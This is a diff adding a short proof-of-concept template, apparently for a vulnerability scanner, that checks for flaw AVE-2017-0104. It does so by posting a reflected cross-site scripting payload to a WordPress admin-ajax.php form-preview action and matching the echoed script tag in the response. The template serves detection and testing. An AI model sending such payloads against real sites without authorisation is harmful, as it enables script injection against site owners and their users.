@@ -1,0 +1,29 @@
+[info]
+author = "AVE"
+description = "AVE-2017-0104 verification"
+id = "POC-AVE-2017-0104"
+name = "PoC for AVE-2017-0104"
+severity = "medium"
+tags = ["ave-2017-0104"]
+vuln_id = ["AVE-2017-0104"]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wp-admin/admin-ajax.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=frm_forms_preview&before_html=<img src=x onerror=alert(document.domain)>"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<img src=x onerror=alert(document.domain)>"]
